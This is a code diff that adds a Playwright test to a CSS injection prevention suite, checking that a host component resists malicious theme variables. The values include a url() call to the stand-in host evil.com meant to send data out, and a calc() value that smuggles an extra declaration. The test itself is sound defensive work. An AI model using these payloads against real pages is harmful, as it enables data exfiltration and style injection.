@@ -122,4 +122,30 @@ test.describe('CSS Injection Prevention', () => {
 
     await host.cleanup();
   });
+
+  test('prevents url() and calc() injection attacks', async ({ page }) => {
+    const inlineApp = `data:text/html,${encodeURIComponent(`
+      <!DOCTYPE html>
+      <html>
+      <body>
+        <div id="test">Test Content</div>
+      </body>
+      </html>
+    `)}`;
+
+    // Attempt url() and calc() injection
+    const host = await ReferenceHost.launch(page, inlineApp, {
+      theme: {
+        '--malicious-url': 'url("http://evil.com/steal.php?data=")',
+        '--malicious-calc': 'calc(100% - 10px); background: red',
+        '--with-comments': 'red /* comment */ blue',
+      },
+      sandbox: 'allow-scripts allow-same-origin',
+    });
+
+    const frame = host.getAppFrame();
+    await expect(frame.locator('#test')).toBeVisible();
+
+    await host.cleanup();
+  });
 });
